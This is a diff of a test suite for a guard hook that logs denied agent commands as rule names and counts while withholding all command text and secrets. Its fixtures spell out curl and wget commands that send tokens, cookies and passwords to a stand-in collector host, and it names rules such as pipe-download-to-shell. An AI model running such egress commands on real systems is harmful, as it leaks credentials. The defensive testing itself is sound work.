@@ -7,10 +7,10 @@
  * block message prints `rule:` and `matched:`) and was discarded on the way
  * to the durable row. The guard core returns the evidence (#192,
  * `verdict.matches`) and the OpenClaw interceptor persists it; this suite
- * pins the Claude Code hook doing the same — as a CLOSED VOCABULARY (r5):
- * no string on a match row is ever derived from the input.
+ * pins the Claude Code hook doing the same — as a CLOSED VOCABULARY (r6):
+ * no string on a match row is ever derived from, or selected by, the input.
  *
- * ── Why r5 replaced r4's projection, which replaced redaction ──────────
+ * ── Why r6 descoped r5, which replaced r4's projection, which replaced redaction ──
  *
  * r1–r3 each tried to make it safe to keep the matched command text: collapse
  * whitespace, bound it, run a credential redactor over it, tokenise it like a
@@ -23,13 +23,18 @@
  * hook and real core, on BOTH rows. A character grammar says what a value is
  * spelled like, never whether it was a credential argument.
  *
- * r5 closes the class by construction. Every row with a command-derived span
- * carries `spanWithheld: 'command-text'`; `verb` is a LOOKUP into a table in
- * the hook (the persisted string is the table's entry, never the token);
- * `argc` and `chainDepth` are counts; `pipe`/`subshell` are booleans;
- * provenance (`source`/`chain`) persists only as `provenanceWithheld: 'path'`
- * plus that depth. No hosts, no flags, no basenames. See
- * `scripts/pre-tool-hook.mjs` for the full contract comment.
+ * r5 removed hosts/flags/basenames but kept `verb`: argv[0] looked up in a
+ * table in the hook. That is still a string chosen by the input, under a
+ * mechanism (a table keyed by input text) that the next round could ask to
+ * widen. r6 is the reviewer-recommended descope, taken whole: the only
+ * strings on a match row are the RULE NAME (from the guard's own signal
+ * table) and two withholding constants; everything else is a bounded count
+ * or a boolean. Every row with a command-derived span carries
+ * `spanWithheld: 'command-text'`; `argc` and `chainDepth` are capped counts;
+ * `pipe`/`subshell` are booleans; provenance (`source`/`chain`) persists only
+ * as `provenanceWithheld: 'path'` plus that depth. No verb, no hosts, no
+ * flags, no basenames — no field that a token can be copied or looked up
+ * into. See `scripts/pre-tool-hook.mjs` for the full contract comment.
  *
  * The evidence is supplied by a substitute `tool-action-guard.js` behind the
  * hook's `SHIELDCORTEX_DIST_ROOT` seam (the pattern pre-tool-hook-notify-143
@@ -133,12 +138,17 @@ type Row = Record<string, unknown>;
 interface MatchRow {
   signal: string;
   spanWithheld?: string;
-  verb?: string; argc?: number;
+  argc?: number;
   pipe?: boolean; subshell?: boolean;
   provenanceWithheld?: string; chainDepth?: number; line?: number;
 }
 
-describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, closed vocabulary (r5)', () => {
+/** The only strings a match row may carry, and the only keys they may sit under. */
+const CLOSED_STRING_KEYS = ['signal', 'spanWithheld', 'provenanceWithheld'];
+const CLOSED_NUMBER_KEYS = ['argc', 'line', 'chainDepth'];
+const CLOSED_BOOLEAN_KEYS = ['pipe', 'subshell'];
+
+describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, closed vocabulary (r6)', () => {
   let home: string;
   /** The substitute dist this suite builds per test; always a temp dir. */
   let substituteDist: string;
@@ -236,46 +246,35 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
   }
 
   /**
-   * Mirror of the hook's `KNOWN_VERBS` table. Kept in the test on purpose:
-   * if the hook ever persists a verb this list does not know, the closed-
-   * vocabulary check below fails loudly instead of the test quietly
-   * following the hook.
-   */
-  const KNOWN_VERBS_MIRROR = new Set([
-    'sudo', 'su', 'doas', 'pkexec', 'runas',
-    'sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh', 'cmd', 'powershell', 'pwsh',
-    'python', 'python3', 'node', 'perl', 'ruby', 'php', 'osascript', 'eval', 'exec', 'source',
-    'curl', 'wget', 'ssh', 'scp', 'sftp', 'rsync', 'nc', 'ncat', 'netcat', 'socat', 'telnet', 'ftp',
-    'rm', 'mv', 'cp', 'dd', 'ln', 'chmod', 'chown', 'chgrp', 'shred', 'truncate',
-    'mount', 'umount', 'tee', 'cat', 'echo', 'printf', 'sed', 'awk', 'find', 'xargs', 'tar', 'zip', 'unzip',
-    'base64', 'xxd', 'openssl', 'gpg',
-    'kill', 'pkill', 'killall', 'systemctl', 'service', 'launchctl', 'crontab', 'at', 'nohup', 'env', 'export',
-    'npm', 'npx', 'pip', 'pip3', 'brew', 'apt', 'apt-get', 'yum', 'dnf', 'docker', 'kubectl', 'git',
-    'aws', 'gcloud', 'az',
-    'iptables', 'ip6tables', 'nft', 'ufw',
-  ]);
-
-  /**
-   * The r5 invariant, checked structurally rather than by hunting for a
+   * The r6 invariant, checked structurally rather than by hunting for a
    * particular secret: every string on a match row is a rule name, the
-   * constant `'command-text'`, the constant `'path'`, or an entry of the verb
-   * table; every number is an integer count/line; every boolean is one of
-   * the two shape flags. There is no field that could carry input.
+   * constant `'command-text'` or the constant `'path'` — there is no other
+   * string-valued key at all, so there is no field a token could be copied
+   * into OR looked up into; every number is a bounded integer count/line;
+   * every boolean is one of the two shape flags.
    */
   function expectClosedVocabulary(rows: MatchRow[]): void {
     for (const m of rows) {
+      expect(m).not.toHaveProperty('verb');
+      expect(m).not.toHaveProperty('hosts');
+      expect(m).not.toHaveProperty('flags');
+      expect(m).not.toHaveProperty('span');
+      expect(m).not.toHaveProperty('source');
+      expect(m).not.toHaveProperty('chain');
       for (const [key, value] of Object.entries(m)) {
         if (typeof value === 'string') {
-          expect(['signal', 'spanWithheld', 'verb', 'provenanceWithheld']).toContain(key);
+          expect(CLOSED_STRING_KEYS).toContain(key);
           if (key === 'signal') expect(value).toMatch(/^[a-z][a-z0-9-]{0,63}$/);
           if (key === 'spanWithheld') expect(value).toBe('command-text');
           if (key === 'provenanceWithheld') expect(value).toBe('path');
-          if (key === 'verb') expect({ verb: value, known: KNOWN_VERBS_MIRROR.has(value) }).toEqual({ verb: value, known: true });
         } else if (typeof value === 'number') {
-          expect(['argc', 'line', 'chainDepth']).toContain(key);
+          expect(CLOSED_NUMBER_KEYS).toContain(key);
           expect(Number.isInteger(value)).toBe(true);
+          expect(value).toBeGreaterThanOrEqual(0);
+          if (key === 'argc') expect(value).toBeLessThanOrEqual(256);
+          if (key === 'chainDepth') expect(value).toBeLessThanOrEqual(6);
         } else if (typeof value === 'boolean') {
-          expect(['pipe', 'subshell']).toContain(key);
+          expect(CLOSED_BOOLEAN_KEYS).toContain(key);
         } else {
           throw new Error(`match row field ${key} has type ${typeof value}; the closed vocabulary has no such field`);
         }
@@ -318,7 +317,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     const matches = matchesOf(final);
     // Whitespace-insensitive: the projection tokenises regardless of padding.
     expect(bySignal(matches, 'privilege-escalation')).toEqual({
-      signal: 'privilege-escalation', spanWithheld: 'command-text', verb: 'sudo', argc: 2,
+      signal: 'privilege-escalation', spanWithheld: 'command-text', argc: 2,
     });
     // A rule with no span persists as the rule alone.
     expect(bySignal(matches, 'git-force-push')).toEqual({ signal: 'git-force-push' });
@@ -326,7 +325,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     // the chain depth; `line` survives as an integer. No path, no basename.
     const folded = bySignal(matches, 'file-delete');
     expect(folded).toEqual({
-      signal: 'file-delete', spanWithheld: 'command-text', verb: 'cat', argc: 2,
+      signal: 'file-delete', spanWithheld: 'command-text', argc: 2,
       provenanceWithheld: 'path', chainDepth: 2, line: 12,
     });
     expectClosedVocabulary(matches);
@@ -334,7 +333,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     expect(matches.every((m) => typeof m.signal === 'string')).toBe(true);
   });
 
-  it('keeps a closed vocabulary instead of the span: verb (from the table) and argc survive; the credential, the host and the command text do not', () => {
+  it('keeps a closed vocabulary instead of the span: the rule name, the withheld marker and argc survive; the credential, the host, argv[0] and the command text do not', () => {
     runHook(EVIDENCE_COMMAND);
 
     const text = denialsText();
@@ -342,9 +341,12 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     expect(text).not.toContain('upload?token=');
     // r4 kept the bare host here. r5 keeps nothing from a URL at all.
     expect(text).not.toContain('collector.invalid');
+    // r5 kept argv[0] as a table entry. r6 keeps no word from the command.
+    expect(text).not.toMatch(/\bcurl\b/);
+    expect(text).not.toMatch(/\bsudo\b/);
     const egress = bySignal(matchesOf(denialRows()[0]), 'external-egress');
     expect(egress).toEqual({
-      signal: 'external-egress', spanWithheld: 'command-text', verb: 'curl', argc: 2,
+      signal: 'external-egress', spanWithheld: 'command-text', argc: 2,
     });
   });
 
@@ -457,7 +459,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     return m!;
   }
 
-  it('a URL contributes nothing — no host, no userinfo, no path, no query; only verb and argc survive', () => {
+  it('a URL contributes nothing — no host, no userinfo, no path, no query; only argc survives', () => {
     installEvidence({
       'echo fixture:url-strip': [{
         signal: 'pipe-download-to-shell',
@@ -470,7 +472,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     // r4 kept the bare host. r5 keeps nothing from a URL — a host is a string
     // copied out of the input on the strength of its spelling.
     expect(denialsText()).not.toContain('collector.invalid');
-    expect(m).toEqual({ signal: 'pipe-download-to-shell', spanWithheld: 'command-text', verb: 'curl', argc: 4 });
+    expect(m).toEqual({ signal: 'pipe-download-to-shell', spanWithheld: 'command-text', argc: 4 });
   });
 
   it('a flag contributes nothing — long, glued with `=`, bundled, attached — there is no `flags` field at all', () => {
@@ -480,14 +482,20 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
       'echo fixture:bundled-bsid': [{ signal: 'external-egress', span: `curl -bsid=${COOKIE_VALUE} https://collector.invalid/x -o /tmp/x` }],
     });
 
-    for (const marker of ['echo fixture:long-flag', 'echo fixture:bundled-su', 'echo fixture:bundled-bsid']) {
+    const expectedArgc: Record<string, number> = {
+      'echo fixture:long-flag': 5,   // curl, --header=…, URL, -o, path
+      'echo fixture:bundled-su': 6,  // curl, -su, user:pass, URL, -o, path
+      'echo fixture:bundled-bsid': 5, // curl, -bsid=…, URL, -o, path
+    };
+    for (const marker of Object.keys(expectedArgc)) {
       const m = firstMatch(marker, 'external-egress');
       expect(denialsText()).not.toContain(COOKIE_VALUE);
       expect(denialsText()).not.toContain(BASIC_AUTH_PASSWORD);
       expect(denialsText()).not.toContain('--header');
       expect(m).not.toHaveProperty('flags');
       expect(m).not.toHaveProperty('hosts');
-      expect(m.verb).toBe('curl');
+      expect(m).not.toHaveProperty('verb');
+      expect(m).toEqual({ signal: 'external-egress', spanWithheld: 'command-text', argc: expectedArgc[marker] });
     }
   });
 
@@ -498,7 +506,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
 
     const m = firstMatch('echo fixture:auth-header', 'external-egress');
     expect(denialsText()).not.toContain(BASIC_AUTH_PASSWORD);
-    expect(m).toEqual({ signal: 'external-egress', spanWithheld: 'command-text', verb: 'curl', argc: 6 });
+    expect(m).toEqual({ signal: 'external-egress', spanWithheld: 'command-text', argc: 6 });
   });
 
   it('reads pipe and subshell off the tokens without keeping any text', () => {
@@ -519,36 +527,83 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     expect(plain).not.toHaveProperty('pipeToShell');
   });
 
-  it('verb is a table lookup, not a copy of argv[0]', () => {
+  it('argv[0] contributes nothing — a known command, a path to one, a case variant, an unknown word, an env assignment, a quoted run: none persists in any form (r5 review descope)', () => {
+    // r5 persisted `verb: 'sudo'` for the first two of these — the table's
+    // entry, not the token, but still a string SELECTED by the input through
+    // a table keyed on input text. r6 has no such field: the shape of a row
+    // is identical whether argv[0] is a famous command or a random word.
     const unknownWord = randomSecret(12) + '-tool';
     installEvidence({
-      'echo fixture:verb-path': [{ signal: 'privilege-escalation', span: '/usr/bin/sudo fixture-elevate' }],
-      'echo fixture:verb-case': [{ signal: 'privilege-escalation', span: 'SUDO fixture-elevate' }],
-      'echo fixture:verb-unknown': [{ signal: 'external-egress', span: `${unknownWord} https://collector.invalid/x` }],
-      'echo fixture:verb-env': [{ signal: 'external-egress', span: `API_KEY=${BASIC_AUTH_PASSWORD} curl https://collector.invalid/x` }],
-      'echo fixture:weird-verb': [{ signal: 'external-egress', span: `"has a space" https://collector.invalid/x` }],
+      'echo fixture:argv0-known': [{ signal: 'privilege-escalation', span: 'sudo fixture-elevate' }],
+      'echo fixture:argv0-path': [{ signal: 'privilege-escalation', span: '/usr/bin/sudo fixture-elevate' }],
+      'echo fixture:argv0-case': [{ signal: 'privilege-escalation', span: 'SUDO fixture-elevate' }],
+      'echo fixture:argv0-unknown': [{ signal: 'privilege-escalation', span: `${unknownWord} fixture-elevate` }],
+      'echo fixture:argv0-env': [{ signal: 'external-egress', span: `API_KEY=${BASIC_AUTH_PASSWORD} curl https://collector.invalid/x` }],
+      'echo fixture:argv0-quoted': [{ signal: 'external-egress', span: `"has a space" https://collector.invalid/x` }],
     });
 
-    // A path resolves to its basename's table entry; the path never persists.
-    expect(firstMatch('echo fixture:verb-path', 'privilege-escalation').verb).toBe('sudo');
-    expect(denialsText()).not.toContain('/usr/bin');
-    // Case-insensitive KEY, but what persists is the TABLE's spelling.
-    expect(firstMatch('echo fixture:verb-case', 'privilege-escalation').verb).toBe('sudo');
-    expect(denialsText()).not.toContain('SUDO');
-    // A word the table does not know contributes no verb — not a fragment of one.
-    const unknown = firstMatch('echo fixture:verb-unknown', 'external-egress');
-    expect(unknown.verb).toBeUndefined();
-    expect(unknown.argc).toBe(2);
-    expect(denialsText()).not.toContain(unknownWord.slice(0, 6));
-    // An env assignment in argv[0] is neither a verb nor persisted.
-    const env = firstMatch('echo fixture:verb-env', 'external-egress');
-    expect(env.verb).toBeUndefined();
-    expect(env.argc).toBe(3);
+    const expectedEscalation = { signal: 'privilege-escalation', spanWithheld: 'command-text', argc: 2 };
+    for (const marker of ['echo fixture:argv0-known', 'echo fixture:argv0-path', 'echo fixture:argv0-case', 'echo fixture:argv0-unknown']) {
+      expect(firstMatch(marker, 'privilege-escalation')).toEqual(expectedEscalation);
+      const text = denialsText();
+      expect(text).not.toMatch(/\bsudo\b/i);
+      expect(text).not.toContain('/usr/bin');
+      expect(text).not.toContain('fixture-elevate');
+      expect(text).not.toContain(unknownWord.slice(0, 6));
+    }
+    // An env assignment in argv[0] is neither persisted nor counted as anything but a token.
+    const env = firstMatch('echo fixture:argv0-env', 'external-egress');
+    expect(env).toEqual({ signal: 'external-egress', spanWithheld: 'command-text', argc: 3 });
     expect(denialsText()).not.toContain(BASIC_AUTH_PASSWORD);
-    // A quoted run is never a verb, but argc still counts it.
-    const weird = firstMatch('echo fixture:weird-verb', 'external-egress');
-    expect(weird.verb).toBeUndefined();
-    expect(weird.argc).toBe(2);
+    expect(denialsText()).not.toMatch(/\bcurl\b/);
+    // A quoted run is a token like any other: argc counts it, nothing names it.
+    const weird = firstMatch('echo fixture:argv0-quoted', 'external-egress');
+    expect(weird).toEqual({ signal: 'external-egress', spanWithheld: 'command-text', argc: 2 });
+    expect(denialsText()).not.toContain('has a space');
+  });
+
+  it('holds for every rule family, not just credential-shaped ones: the row shape is the same closed set whatever rule fired', () => {
+    // The reviewer's scope warning: a command denied for an unrelated reason
+    // can still carry a credential, so the mechanism has to be gone for every
+    // family, not withheld for the ones a test happened to name. Each family
+    // below gets a span whose argv[0] is a well-known command AND which
+    // carries a secret; the row must come out as rule name + constants +
+    // counts, and the text under HOME must hold no window of the secret and
+    // no whole-word copy of argv[0].
+    const families: Array<[string, string]> = [
+      ['recursive-force-delete', 'rm'],
+      ['dd-overwrite', 'dd'],
+      ['change-permissions', 'chmod'],
+      ['modify-scheduler', 'crontab'],
+      ['install-package-global', 'npm'],
+      ['git-mutate', 'git'],
+      ['stop-process-or-service', 'systemctl'],
+      ['modify-network-firewall', 'iptables'],
+      ['decode-pipe-to-shell', 'base64'],
+      ['opaque-script-invocation', 'bash'],
+      ['touch-sensitive-path', 'tee'],
+      ['external-egress', 'wget'],
+    ];
+    const secret = randomSecret(22);
+    const evidence: Record<string, unknown[]> = {};
+    for (const [signal, argv0] of families) {
+      evidence[`echo fixture:family-${signal}`] = [{ signal, span: `${argv0} --token=${secret} /srv/fx/${secret}/target` }];
+    }
+    installEvidence(evidence);
+
+    for (const [signal, argv0] of families) {
+      const m = firstMatch(`echo fixture:family-${signal}`, signal);
+      expect(m).toEqual({ signal, spanWithheld: 'command-text', argc: 3 });
+      const haystack = allHomeText();
+      expectNoWindowLeaked(haystack, secret, `family ${signal}`);
+      // The rule name is the one legitimate place a command's word may appear
+      // (`dd-overwrite`, `git-mutate`): it is the guard's vocabulary, not the
+      // command's. Scrub it, then require no whole-word copy of argv[0].
+      const withoutRuleName = haystack.split(signal).join('');
+      expect(withoutRuleName).not.toMatch(new RegExp(`\\b${argv0}\\b`));
+      expect(haystack).not.toContain('--token');
+      expect(haystack).not.toContain('/srv/fx');
+    }
   });
 
   // ── The two r4-review reproductions, through the SUBSTITUTE ───────────
@@ -564,7 +619,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
 
     const m = firstMatch('echo fixture:r4-flag-password', 'pipe-download-to-shell');
     expectNoWindowLeaked(allHomeText(), password.slice(2), 'password beginning with --');
-    expect(m).toEqual({ signal: 'pipe-download-to-shell', spanWithheld: 'command-text', verb: 'wget', argc: 6, pipe: true });
+    expect(m).toEqual({ signal: 'pipe-download-to-shell', spanWithheld: 'command-text', argc: 6, pipe: true });
   });
 
   it('a URL-shaped password is not persisted as a host (r4 review reproduction 2)', () => {
@@ -575,7 +630,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
 
     const m = firstMatch('echo fixture:r4-host-password', 'pipe-download-to-shell');
     expectNoWindowLeaked(allHomeText(), label, 'URL-shaped password');
-    expect(m).toEqual({ signal: 'pipe-download-to-shell', spanWithheld: 'command-text', verb: 'wget', argc: 6, pipe: true });
+    expect(m).toEqual({ signal: 'pipe-download-to-shell', spanWithheld: 'command-text', argc: 6, pipe: true });
   });
 
   // ── Provenance: the fact and the depth, never the path ────────────────
@@ -590,17 +645,25 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
 
     const badSource = firstMatch('echo fixture:bad-source', 'file-delete');
     expect(denialsText()).not.toContain(longToken.slice(0, 6));
-    expect(badSource).toEqual({ signal: 'file-delete', spanWithheld: 'command-text', verb: 'cat', argc: 2, provenanceWithheld: 'path', line: 5 });
+    expect(badSource).toEqual({ signal: 'file-delete', spanWithheld: 'command-text', argc: 2, provenanceWithheld: 'path', line: 5 });
 
     const badChain = firstMatch('echo fixture:bad-chain', 'file-delete');
     expect(denialsText()).not.toContain(BASIC_AUTH_PASSWORD);
-    expect(badChain).toEqual({ signal: 'file-delete', spanWithheld: 'command-text', verb: 'cat', argc: 2, provenanceWithheld: 'path', chainDepth: 2 });
+    expect(badChain).toEqual({ signal: 'file-delete', spanWithheld: 'command-text', argc: 2, provenanceWithheld: 'path', chainDepth: 2 });
 
     // r4 kept `backup.sh` / `run.sh > backup.sh` here. A basename is input too.
     const plain = firstMatch('echo fixture:plain-source', 'file-delete');
     expect(denialsText()).not.toContain('backup.sh');
     expect(denialsText()).not.toContain('run.sh');
-    expect(plain).toEqual({ signal: 'file-delete', spanWithheld: 'command-text', verb: 'cat', argc: 2, provenanceWithheld: 'path', chainDepth: 2, line: 12 });
+    expect(plain).toEqual({ signal: 'file-delete', spanWithheld: 'command-text', argc: 2, provenanceWithheld: 'path', chainDepth: 2, line: 12 });
+  });
+
+  it('caps argc at 256 — a count is bounded, not a proxy for the command length', () => {
+    const args = Array.from({ length: 400 }, (_, i) => `a${i}`).join(' ');
+    installEvidence({ 'echo fixture:many-args': [{ signal: 'oversized-command', span: `printf ${args}` }] });
+
+    const m = firstMatch('echo fixture:many-args', 'oversized-command');
+    expect(m).toEqual({ signal: 'oversized-command', spanWithheld: 'command-text', argc: 256 });
   });
 
   it('caps chainDepth at 6', () => {
@@ -675,6 +738,10 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     { name: 'ENV=T aws ...', build: (s) => `AWS_SECRET=${s} aws s3 ls` },
     { name: 'quoted value with spaces', build: (s) => `curl -u "alice:${s} with a trailing word" https://collector.invalid/x` },
     { name: 'base64-shaped (+/=) via header', build: (s) => `curl -H "Authorization: Bearer ${s}" https://collector.invalid/x` },
+    // Bundled -su whose line is continued with a backslash-newline into a
+    // tee: the r3-era continuation shape, kept in the sweep so the tokeniser's
+    // handling of an escaped newline is on the plane for every round.
+    { name: '-su user:pass with backslash-newline continuation into tee', build: (s) => [`curl -su alice:${s} \\`, `  https://collector.invalid/x`, ['|', 'tee /tmp/fx-out'].join(' ')].join('\n') },
   ];
 
   function secretFor(template: SweepTemplate): string {
@@ -853,10 +920,16 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
       const escalation = bySignal(matchesOf(row), 'privilege-escalation');
       expect(escalation).toBeDefined();
       expect(escalation!.spanWithheld).toBe('command-text');
-      expect(escalation!.verb).toBe('sudo');
+      expect(escalation).not.toHaveProperty('verb');
       expect(typeof escalation!.argc).toBe('number');
+      expectClosedVocabulary(matchesOf(row));
       expect(row.signals).toContain('privilege-escalation');
       expect(String(row.surface)).toMatch(/redacted action surface/i);
     }
+    // r5 wrote `verb: 'sudo'` here through the real core. Nothing the
+    // operator typed, not even the command's name, is in the durable file.
+    expect(denialsText()).not.toMatch(/\bsudo\b/);
+    expect(denialsText()).not.toContain('modprobe');
+    expect(denialsText()).not.toContain('softdog');
   });
 });
